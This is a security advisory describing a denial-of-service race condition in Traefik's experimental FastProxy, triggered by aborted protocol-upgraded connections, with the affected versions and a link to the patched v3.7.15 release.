GHSA-ww7c-q3mv-xx22.description: ## Summary There is a high severity vulnerability in Traefik's experimental FastProxy (`experimental.fastProxy`). Once a backend answers a protocol upgrade (`101 Switching Protocols`, e.g. WebSocket), the connection pool keeps reading from the backend connection while the tunnel copier reads from the same buffered reader, with no synchronization between them. An unauthenticated client that repeatedly opens upgraded connections and aborts them can corrupt the reader's internal state and trigger an unrecovered panic that terminates the whole Traefik process, causing a denial of service. Only deployments that enable `experimental.fastProxy` are affected. Traefik v2 is not affected, as FastProxy was introduced in v3.2. Traefik v3.2 to v3.6 are affected and no longer maintained, so they will not receive a patch: users on those versions should upgrade to a patched v3.7 release. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.15 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).
